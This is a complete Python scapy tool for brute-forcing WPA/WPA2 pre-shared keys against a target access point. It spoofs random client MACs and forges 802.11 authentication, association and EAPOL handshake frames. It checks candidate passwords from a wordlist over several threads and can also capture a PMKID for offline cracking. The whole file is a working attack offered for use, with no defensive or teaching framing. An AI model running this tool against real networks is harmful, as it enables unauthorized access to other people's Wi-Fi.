#!/usr/bin/python3
from scapy.all import *
from threading import Thread
from time import sleep
import hmac,hashlib,binascii
import random
from sys import argv
from os import system
import argparse
from colorama import Fore


passwords = []
found = None

parser = argparse.ArgumentParser(description='WPA PSK bruteforce')
parser.add_argument("-iface", type=str, metavar='iface', default='wlan1', help="interface")
parser.add_argument("-bssid", type=str, metavar='MAC', help="target BSSID")
parser.add_argument("-essid", type=str, metavar='SSID', help="target ESSID")
parser.add_argument("-password", nargs='*', metavar='12345678 123456789', help="password string")
parser.add_argument("-passwords", type=str, metavar='wordlist.txt', help="passwords file")
parser.add_argument("-pmkid", dest="pmkid", action="store_true", default=False, help="check PMKID")
parser.add_argument('-c', dest="channel", type=int, help='AP channel')
parser.add_argument("-t", dest="threads", type=int, default=1, help="threads")
parser.add_argument("-T", dest="timeout", type=int, default=15, help="timeout")
parser.add_argument("-d", dest="debug", action="store_true", default=False, help="show more info")
args = parser.parse_args()
conf.iface = args.iface

class IEEE80211(Exception):
    pass

class Brute:
    TIMEOUT = 10
    def __init__(self, target, essid):
        self.source = ""
        self.target = target
        self.essid = essid

    def clear(self):
        self.is_auth_found = False
        self.is_assoc_found = False
        self.anonce = ""
        self.amic = ""
        self.m1 = None
        self.beacon = None

    @staticmethod
    def get_random_mac(l=6):
        return ':'.join(list(map(lambda x:"%02x"%int(random.random()*0xff),range(l))))
        #return "11:22:33:44:55"

    @staticmethod
    def PRF_512(key,A,B):
        return b''.join(hmac.new(key,A+chr(0).encode()+B+chr(i).encode(),hashlib.sha1).digest() for i in range(4))[:64]

    @staticmethod
    def get_rand(n):
        o = b''
        for _ in range(n):
            o += int(random.random()*255).to_bytes(1, 'big')
        return o

    @staticmethod
    def b(mac):
        o = b''
        for m in mac.split(':'):
            o += int(m, 16).to_bytes(1, 'big')
        return o

    @staticmethod
    def checksum(data):
        FSC = binascii.crc32(data) % (1<<32)
        FSC = str(hex(FSC))[2:]
        FSC = "0" * (8-len(FSC)) + FSC
        return bytes.fromhex(FSC)[::-1]

    def handle_beacon(self, p):
        seen_receiver = p[Dot11].addr1
        seen_sender = p[Dot11].addr2
        seen_bssid = p[Dot11].addr3
        if self.target.lower() == seen_bssid.lower() and \
        Dot11Beacon in p:
            self.beacon = p
            return True
    def get_beacon(self):
        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(Dot11Beacon), stop_filter=self.handle_beacon, timeout=self.TIMEOUT)

    def handle_authorization_response(self, p):
        seen_receiver = p[Dot11].addr1
        seen_sender = p[Dot11].addr2
        seen_bssid = p[Dot11].addr3

        if self.target.lower() == seen_bssid.lower() and \
        self.target.lower() == seen_sender.lower() and \
        self.source.lower() == seen_receiver.lower():
            self.is_auth_found = True
            if debug:
                print("[*] Detected Authentication from Source {0}".format(seen_bssid))
        return self.is_auth_found
    def get_authorization_response(self):
        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(Dot11Auth), stop_filter=self.handle_authorization_response, timeout=self.TIMEOUT)

    def handle_association_response(self, p):
        seen_receiver = p[Dot11].addr1
        seen_sender = p[Dot11].addr2
        seen_bssid = p[Dot11].addr3

        if self.target.lower() == seen_bssid.lower() and \
        self.target.lower() == seen_sender.lower() and \
        self.source.lower() == seen_receiver.lower():
            self.is_assoc_found = True
            if debug:
                print("[*] Detected Association Response from Source {0}".format(seen_bssid))
        return self.is_assoc_found
    def get_association_response(self):
        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(Dot11AssoResp), stop_filter=self.handle_association_response, timeout=self.TIMEOUT)

    def handle_m1(self, p):
        seen_receiver = p[Dot11].addr1
        seen_sender = p[Dot11].addr2
        seen_bssid = p[Dot11].addr3
        key_mic_is_set = 0b100000000
        if self.target.lower() == seen_bssid.lower() and \
        self.target.lower() == seen_sender.lower() and \
        self.source.lower() == seen_receiver.lower() and \
        not int.from_bytes(bytes(p[EAPOL].payload)[1:3], byteorder='big') & key_mic_is_set:
            self.anonce = bytes(p[EAPOL].payload)[13:13+32]
            self.m1 = p
            if debug:
                print("[*] EAPOL M1 from source {}".format(seen_bssid))
            return True
    def get_m1(self):
        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(EAPOL), stop_filter=self.handle_m1, timeout=self.TIMEOUT)

    def handle_m3(self, p):
        seen_receiver = p[Dot11].addr1
        seen_sender = p[Dot11].addr2
        seen_bssid = p[Dot11].addr3
        key_mic_is_set = 0b100000000
        if self.target.lower() == seen_bssid.lower() and \
        self.target.lower() == seen_sender.lower() and \
        self.source.lower() == seen_receiver.lower() and \
        int.from_bytes(bytes(p[EAPOL].payload)[1:3], byteorder='big') & key_mic_is_set:
            self.amic = bytes(p[EAPOL].payload)[77:77+16]
            if debug:
                print("[*] EAPOL M3 from source {}".format(seen_bssid))
            return True
    def get_m3(self):
        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(EAPOL), stop_filter=self.handle_m3, timeout=self.TIMEOUT)

    def has_pmkid(self):
        if self.m1:
            return bytes(self.m1[EAPOL].payload)[93:95] != b'\x00\x00'

    def get_pmkid(self):
        return bytes(self.m1[EAPOL].payload)[101:101+16]

    def auth(self, password):
        self.clear()
        self.source = "00:" + self.get_random_mac(5)
        Thread(target=self.get_beacon).start()
        wait = 0
        while not self.beacon and wait < self.TIMEOUT:
            sleep(0.01)
            wait += 0.01
        if not self.beacon:
            raise IEEE80211("NO_BEACON")

        authorization_request = RadioTap()/Dot11(proto=0, FCfield=0, subtype=11, addr2=self.source, addr3=self.target, addr1=self.target, SC=0, type=0)\
            / Dot11Auth(status=0, seqnum=1, algo=0)

        Thread(target=self.get_authorization_response).start()
        sleep(0.01)
        sendp(authorization_request, verbose=0)
        wait = 0
        while not self.is_auth_found and wait < self.TIMEOUT:
            sleep(0.01)
            wait += 0.01
        if not self.is_auth_found:
            raise IEEE80211("NO_AUTH_RESP")

        if debug:
            print("[+] authenticated")

        layer = self.beacon[Dot11Beacon].payload
        rsn_cap = None
        while True:
            if not layer:
                break
            if layer.ID == 48:
                the_layer = layer.copy()
                the_layer.remove_payload()
                rsn_cap = the_layer
            layer = layer.payload

        association_request = RadioTap() / Dot11(proto=0, FCfield=0, subtype=0, addr2=self.source, addr3=self.target, addr1=self.target, SC=0, type=0) \
            / Dot11AssoReq(listen_interval=5, cap=0x1101) \
            / self.beacon[Dot11Beacon].payload

        Thread(target=self.get_association_response).start()
        Thread(target=self.get_m1).start()
        Thread(target=self.get_m3).start()
        sleep(0.01)
        sendp(association_request, verbose=0)
        wait = 0
        while (not self.is_assoc_found or not self.anonce) and wait < self.TIMEOUT:
            sleep(0.01)
            wait += 0.01
        if not self.is_assoc_found or not self.anonce:
            raise IEEE80211("NO_ASSOC_RESP")

        if debug:
            print("[+] associated")

        wait = 0
        while not self.anonce and wait < self.TIMEOUT:
            sleep(0.01)
            wait += 0.01
        if not self.anonce:
            raise IEEE80211("NO_EAPOL_M1")

        if debug:
            print("[+] M1 ANonce: {0}".format(self.anonce.hex()))

        pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), self.essid.encode(), 4096, 32)
        snonce = self.get_rand(32)
        ptk = self.PRF_512(pmk, b"Pairwise key expansion", min(self.b(self.target),self.b(self.source))+max(self.b(self.target),self.b(self.source))+min(self.anonce,snonce)+max(self.anonce,snonce))
        kck = ptk[0:16]
        if debug:
            print("[*] PTK: {}".format(ptk.hex()))
            print("[*] KCK: {}".format(kck.hex()))

        eapol_data_4 = bytearray(117)
        eapol_data_4[0:1] = b"\x02" # Key Description Type: EAPOL RSN Key
        eapol_data_4[1:1+2] = b"\x01\x0a" # Key Information: 0x010a
        eapol_data_4[3:3+2] = b"\x00\x00" # Key Length: 0
        eapol_data_4[5:5+8] = b"\x00\x00\x00\x00\x00\x00\x00\x01" # Replay Counter: 1
        eapol_data_4[13:13+32] = snonce # WPA Key Nonce
        eapol_data_4[45:45+16] = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" # WPA Key IV
        eapol_data_4[61:61+8] = b"\x00\x00\x00\x00\x00\x00\x00\x00" # WPA Key RSC
        eapol_data_4[69:69+8] = b"\x00\x00\x00\x00\x00\x00\x00\x00" # WPA Key ID
        eapol_data_4[77:77+16] = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" # WPA Key MIC
        eapol_data_4[93:93+2] = b"\x00\x16" # WPA Key Data Length: 22
        eapol_data_4[95:95+26] = bytes(rsn_cap) # WPA Key Data Length

        mic = hmac.new(kck, b"\x01\x03\x00\x75" + bytes(eapol_data_4[:77]) + bytes.fromhex("00000000000000000000000000000000") + bytes(eapol_data_4[93:]), hashlib.sha1).digest()[0:16]
        eapol_data_4[77:77+16] = mic
        if debug:
            print("[*] MIC: {}".format(mic.hex()))

        m2 = RadioTap() / Dot11(proto=0, FCfield=1, addr2=self.source, addr3=self.target, addr1=self.target, subtype=8, SC=0, type=2, ID=55808) \
            / Dot11QoS(TID=6, TXOP=0, EOSP=0) \
            / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x3) \
            / SNAP(OUI=0, code=0x888e) \
            / EAPOL(version=1, type=3, len=117) / bytes(eapol_data_4)

        m2 /= self.checksum(bytes(m2))
        sendp(m2, verbose=0)
        wait = 0
        while not self.amic and wait < self.TIMEOUT:
            sleep(0.01)
            wait += 0.01

        if self.amic:
            if debug:
                print("[+] M3 AMIC: {0}".format(self.amic.hex()))
            return True
        else:
            return False

count = 0
def brute_loop(bssid, essid):
    global passwords, found, count
    brute = Brute(bssid, essid)
    while True:
        if found:
            break
        try:
            password = passwords.pop(0)
        except:
            break
        #print(f"[{brute.source}] check {count}: {password}")
        try:
            count += 1
            c = count
            if brute.auth(password):
                print(f'{Fore.GREEN}[{brute.source}] password found: "{password}" ({c}){Fore.RESET}')
                found = password
                break
            else:
                print(f'{Fore.LIGHTBLACK_EX}[{brute.source}] password wrong: "{password}" ({c}){Fore.RESET}')
        except Exception as e:
            print(f'{Fore.RED}[{brute.source}] exception {str(e)}: "{password}" ({c}){Fore.RESET}')
            passwords = [password] + passwords[:]
            count -= 1

def switch(iface, channel):
    system(f"iwconfig {iface} channel {channel}")
    #system(f"iw {iface} set channel {channel}")

debug = args.debug
if args.channel:
    switch(args.iface, args.channel)
if args.passwords:
    passwords = open(args.passwords).read().split("\n")
elif args.password:
    passwords = args.password
elif args.pmkid:
    brute = Brute(args.bssid, args.essid)
    brute.TIMEOUT = args.timeout
    try:
        brute.auth("")
        if brute.has_pmkid():
            pmkid = brute.get_pmkid()
            print(f"{Fore.GREEN} PMKID: {pmkid.hex()}")
    except Exception as e:
        print(f'{Fore.RED}exception {str(e)}{Fore.RESET}')
    exit(0)
else:
    exit(1)
threads = []
for i in range(args.threads):
    thr = Thread(target=brute_loop, args=(args.bssid, args.essid))
    threads.append(thr)

for thr in threads:
    thr.start()
    sleep(1)

[thr.join() for thr in threads]
